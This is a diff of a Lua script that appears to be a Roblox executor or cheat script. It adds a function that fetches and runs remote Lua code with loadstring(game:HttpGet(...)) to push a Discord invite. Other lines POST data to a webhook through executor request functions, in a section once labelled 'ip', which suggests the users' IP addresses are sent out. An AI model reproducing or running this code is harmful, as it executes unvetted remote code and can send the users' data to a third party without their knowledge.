@@ -127,7 +127,7 @@ _G.FeedBackString = "string"
 
 
 
------- ip -------
+------ Send Message To web Hook -------
 function SendMessageToWebhook()
 Sendmessage()
 end
@@ -286,14 +286,6 @@ end
 coroutine.wrap(LocalScript_ScriptfakeXD)()
 end
 
----------------------- Discord invite from my discord server ----------------------
-function Sunrise()
-	local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
-
-	Module.Prompt({ invite = "https://discord.gg/dW5V25hJ", name = "" }) -- name is optional
-	
-	Module.Join("")
-end
 
 
 
@@ -1202,6 +1194,21 @@ local headers = {
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
+
+
+
+
+
+
+---------------------- Discord invite from my discord server ----------------------
+function Sunrise()
+	local Module = loadstring(game:HttpGet("https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua"))()
+
+	Module.Prompt({ invite = "https://discord.gg/xxdstbR4", name = "" }) -- name is optional
+	
+	Module.Join("")
+end
+
 
 
 
